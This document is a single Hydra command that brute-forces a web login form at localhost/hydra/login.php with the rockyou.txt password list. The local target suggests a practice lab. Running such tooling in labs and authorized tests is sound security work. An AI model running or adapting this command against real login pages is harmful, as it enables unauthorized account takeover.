hydra -l admin@admin.admin -P rockyou.txt -V -t 4 localhost http-form-post \
  "/hydra/login.php:email=^USER^&password=^PASS^&submit=Submit:F=Wrong password!"
